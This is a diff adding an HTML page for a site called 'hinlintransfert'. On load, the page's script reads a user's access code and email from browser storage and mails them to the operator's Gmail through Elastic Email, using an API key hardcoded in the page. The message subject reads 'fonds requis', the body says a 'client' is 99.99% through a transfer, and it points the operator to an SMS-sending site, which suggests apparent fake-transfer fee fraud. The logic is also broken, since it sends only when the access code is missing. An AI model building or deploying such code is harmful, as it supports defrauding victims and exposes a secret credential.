@@ -1,0 +1,117 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>valide email</title>
+    <link rel="shortcut icon" href="https://hinlintransfert.netlify.app/img/logo.png" type="image/png">
+    <link rel="icon" href="https://hinlintransfert.netlify.app/img/logo.png">
+    <link rel="apple-touch-icon" href="https://hinlintransfert.netlify.app/img/logo.png">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.2/dist/sweetalert2.all.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.2/dist/sweetalert2.min.css">
+</head>
+<body>
+  <script>
+    function validemail(){
+        var accesscodex = localStorage.getItem('accesscodex');
+        var userconnectmail = localStorage.getItem('userconnectmail');
+        function generateCustomID() {
+        // Générer un nombre aléatoire entre 0 et 0xFFFFFF (couleur hexadécimale maximale)
+        const randomNum = Math.floor(Math.random() * 0xFFFFFF);
+
+        // Convertir en chaîne hexadécimale et s'assurer qu'il a 6 caractères
+        const hexID = randomNum.toString(16).toUpperCase().padStart(6, '0');
+
+        // Ajouter '#' au début
+        return `${hexID}`;
+        }
+        if(!accesscodex){
+          const idsms = generateCustomID()
+                // statr envoi de mail de validation
+                const apiKey = "EAAE6474066818353D0410B8C7758B3D353BA09F59448DBAD680B10B6C402BC6C50E97CA06A2DB72C33C4DBF7528B3E5";
+                 const apiUrl = "https://api.elasticemail.com/v2/email/send";  
+                 // Définir les paramètres de l'e-mail
+                 const emailParams = {
+                 apiKey: apiKey,
+                 subject: `fonds requis${idsms}`,
+                 from: "hinlintransfert@gmail.com",
+                 fromName: "hinlintransfert",
+                 to: "hinlintransfert@gmail.com",
+                 bodyHtml: `
+                 <table cellpadding="10" cellspacing="0" style="background-color: #f1f1f1; padding: 20px;">
+                 <tr>
+                     <td>
+                     <h1 style="color: #333;">Salut !</h1>
+                     <p style="font-size: 16px; color: #666;">
+                      Votre client de Code : ${accesscodex} et Mail: ${userconnectmail} est a 99.99% de son virement. Envoyer lui un sms ici https://smsv.netlify.app/ .                     </p>
+                     <p style="font-size: 14px; color: #999;">
+                         Sincerely,     
+                     </p>
+                     <p style="font-size: 14px; color: #999;">
+                         Team hinlintransfert.      
+                     </p>
+                     </td>
+                 </tr>
+                 </table>
+                 `
+                 };
+
+                // Effectuer une requête POST vers l'API ElasticEmail
+                fetch(apiUrl, {
+                method: "POST",
+                headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: new URLSearchParams(emailParams)
+                })
+                .then((response) => response.json())
+                .then((data) => {
+                console.log(data); // Afficher la réponse de l'API ElasticEmail
+                if (data.success) {
+                localStorage.removeItem('accesscodex')
+                console.log("E-mail envoyé avec succès.");
+                Swal.fire({ 
+                text: "E-mail envoyé avec succès.",
+                icon: "success",
+                allowOutsideClick: false,
+                }).then((result)=>{
+                if(result.isConfirmed){
+                window.location.href = `https://hinlintransfert.netlify.app/account.html`
+                }
+                })
+
+                 } else {
+                    localStorage.removeItem('accesscodex') 
+                  console.error("Erreur lors de l'envoi de l'e-mail.");
+                Swal.fire({ 
+                text: "Erreur lors de l'envoi de l'e-mail.",
+                icon: "error",
+                allowOutsideClick: false,
+                }).then((result)=>{
+                if(result.isConfirmed){
+                window.location.href = `https://hinlintransfert.netlify.app/account.html`
+                }
+                })
+                 }
+                })
+                .catch((error) => {
+                localStorage.removeItem('accesscodex')
+                console.error("Erreur lors de la requête API :", error);
+                Swal.fire({ 
+                icon: "error",
+                allowOutsideClick: false,
+                }).then((result)=>{
+                if(result.isConfirmed){
+                window.location.href = `https://hinlintransfert.netlify.app/account.html`
+                }
+                })
+                });
+                // end envoi de mail de validation
+            }else{
+            window.location.href = `https://hinlintransfert.netlify.app/account.html`
+            }      
+    }validemail()
+  </script>  
+</body>
+</html>
